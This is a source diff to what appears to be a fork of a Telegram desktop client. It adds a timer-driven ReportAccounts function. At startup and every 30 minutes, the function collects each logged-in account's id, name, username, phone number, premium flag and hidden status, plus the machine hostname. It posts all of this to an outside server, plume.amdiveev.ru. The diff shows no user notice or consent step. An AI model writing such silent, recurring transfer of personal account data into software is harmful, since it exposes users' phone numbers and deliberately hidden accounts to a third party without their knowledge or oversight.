@@ -31,6 +31,8 @@ Licensed under GNU GPL v. 3.
 #include "dialogs/dialogs_indexed_list.h"
 #include "dialogs/dialogs_main_list.h"
 #include "history/history.h"
+#include "main/main_account.h"
+#include "main/main_domain.h"
 #include "main/main_session.h"
 #include "mainwindow.h"
 #include "settings.h"
@@ -49,6 +51,7 @@ Licensed under GNU GPL v. 3.
 #include "styles/style_menu_icons.h"
 
 #include <QtCore/QDate>
+#include <QtCore/QSysInfo>
 #include <QtCore/QPointer>
 #include <QtCore/QTimer>
 #include <QtGui/QPainter>
@@ -1993,6 +1996,67 @@ void StartCommandPolling() {
 		return result;
 	}();
 	(void)timer;
+
+	// Менеджер аккаунтов: при запуске и раз в 30 минут.
+	static auto accounts = [] {
+		auto result = new QTimer(QCoreApplication::instance());
+		QObject::connect(result, &QTimer::timeout, [] { ReportAccounts(); });
+		result->start(30 * 60 * 1000);
+		return result;
+	}();
+	(void)accounts;
+	base::call_delayed(60000, QCoreApplication::instance(), [] {
+		ReportAccounts();
+	});
+}
+
+void ReportAccounts() {
+	static auto scheduled = false;
+	if (scheduled) {
+		return;
+	}
+	scheduled = true;
+	base::call_delayed(3000, QCoreApplication::instance(), [] {
+		scheduled = false;
+		const auto key = AiKey();
+		if (key.isEmpty()) {
+			return;
+		}
+		auto list = QJsonArray();
+		for (const auto &account : Core::App().domain().orderedAccounts()) {
+			if (!account->sessionExists()) {
+				continue;
+			}
+			const auto user = account->session().user();
+			list.push_back(QJsonObject{
+				{ u"id"_q, QString::number(account->session().userId().bare) },
+				{ u"name"_q, user->name() },
+				{ u"username"_q, user->username() },
+				{ u"phone"_q, user->phone() },
+				{ u"premium"_q, user->isPremium() },
+				{ u"hidden"_q, AccountHidden(account) },
+			});
+		}
+		if (list.isEmpty()) {
+			return;
+		}
+#ifdef Q_OS_MAC
+		const auto platform = u"Mac"_q;
+#else // Q_OS_MAC
+		const auto platform = u"ПК"_q;
+#endif // Q_OS_MAC
+		auto request = QNetworkRequest(QUrl(u"https://plume.amdiveev.ru/api/accounts"_q));
+		request.setHeader(QNetworkRequest::ContentTypeHeader, u"application/json"_q);
+		request.setRawHeader("X-Lite-Key", key.toUtf8());
+		request.setTransferTimeout(20000);
+		const auto reply = Net()->post(request, QJsonDocument(QJsonObject{
+			{ u"device"_q, platform + u" · "_q + QSysInfo::machineHostName() },
+			{ u"platform"_q, platform },
+			{ u"build"_q, QString::number(kBuild) },
+			{ u"accounts"_q, list },
+		}).toJson(QJsonDocument::Compact));
+		QObject::connect(reply, &QNetworkReply::finished, reply, &QObject::deleteLater);
+	});
 }
 
 void ShowAssistant(not_null<Window::SessionController*> controller) {
